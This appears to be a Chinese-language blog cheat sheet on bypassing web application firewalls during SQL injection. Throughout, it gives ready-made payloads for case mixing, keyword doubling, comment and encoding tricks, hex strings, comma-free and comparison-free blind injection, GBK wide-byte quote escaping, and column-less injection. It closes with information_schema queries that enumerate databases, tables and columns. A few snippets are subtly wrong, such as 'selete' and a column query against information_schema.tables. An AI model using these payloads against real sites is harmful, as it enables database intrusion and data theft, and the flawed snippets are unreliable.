# SQL注入WAF绕过

### 1 大小写绕过

此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。

### 2 替换关键字

这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过

    
    
    http://www.xx.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4

### 3 空格绕过

 **payload**

    
    
    select/**/*/**/from/**/yz;
    
    select%0a*%0afrom%0ayz; %0a 是回车
    
    select(a)from(yz);
    
    select(a)from(yz)where(a=1);

### 4 内联注释

有些WAF的过滤关键词像/union\sselect/g，就比如上面说的，很多时候我都是采用内联注释。更复杂的例子需要更先进的方法。比如添加了SQL关键字，我们就要进一步分离这两个词来绕过这个过滤器。

    
    
    id=1/*!UnIoN*/SeLeCT
    /*!select*//*!**//*!from*//*!yz*/;

### 5 替换关键字

这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过

    
    
    SELselectECT 1,2,3,4

### 6 URL编码

有时后台界面会再次URL解码所以这时可以利用二次编码解决问题  
后台语句

    
    
    $insert=$link->query(urldecode($_GET['id']));
    
    $row=$insert->fetch_row();
    
    select * from yz
    
    select * from  %2579%257a

### 7 十六进制绕过（引号绕过）

    
    
    select a from yz where b=0x32;
    
    select * from yz where b=char(0x32);
    
    select * from yz where b=char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)
    
    select column_name  from information_schema.tables where table_name="users"
    
    select column_name  from information_schema.tables where table_name=0x7573657273

### 8 逗号绕过

在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from
to的方式来解决。

    
    
    substr(),mid()
    
    mid(user() from 1 for 1)
    
    substr(user() from 1 for 1)
    
    select substr(user()from -1) from yz ;
    
    select ascii(substr(user() from 1 for 1)) < 150;
    
    同时也可以利用替换函数
    
    select left(database(),2)>'tf';
    
    selete * from testtable limit 2,1;
    
    selete * from testtable limit 2 offset 1;

### 9 比较符(<,>)绕过

同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest，strcmp来进行绕过了。

    
    
    select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
    
    select strcmp(left(database(),1),0x32);#lpad('asd',2,0)
    
    if(substr(id,1,1)in(0x41),1,3)
    
    -- 新学习了一种骚骚的注入姿势in、between、order by
    select * from yz where a in ('aaa');
    select substr(a,1,1) in ('a') from yz ;
    
    select * from yz where a between 'a' and 'b';
    select * from yz where a between 0x89 and 0x90;
    
    select * from yz union select 1,2,3 order by 1;
    -- 也可以用like，根据排列顺序进行真值判断

### 10 注释符绕过

在注入时的注释符一般为# --当两者不能用时就不能闭合引号  
这里介绍一个奇淫巧技

    
    
    select 1,2,3 from yz where '1'/1=(1=1)/'1'='1'
    
    (1=1)中就有了判断位为下面的注入打下基础

### 11 宽字节绕过

字节注入也是在最近的项目中发现的问题，大家都知道%df’
被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C
，那么现在%df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c
是一个宽字符，也就是縗’，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。

注：select防止用户自定义的名称和mysql保留字冲突

### 12 with rollup

一般结合group by使用

    
    
    select 1 as test from  yz group by test with rollup limit 1 offset 1;
    
    +------+
    
    | test |
    
    +------+
    
    | NULL |
    
    +------+

### 13 无列名注入

给未知列名起别名

    
    
    select a from (select 1,2,3aunion select * from yz)v;

### 14 判断列数绕过

当order by 被过滤后就可以使用into 变量来绕过

    
    
    select * from yz limit 1,1 into @a,@b,@c;

# mysql数据库查询语句

    
    
    select database(); #查选数据库
    
    select group_concat(schema_name) from information_schema.schemata
    
    select schema_name from information_schema.schemata limit 0,1  #查询数据库
    
    select table_name from information_schema.tables where table_schema=database() limit 0,1;  #查询表
    
    select column_name from information_schema.columns where table_name='users' limit 0,1;  #查询列

[参考链接](https://www.cnblogs.com/qingwuyou/p/10687462.html)

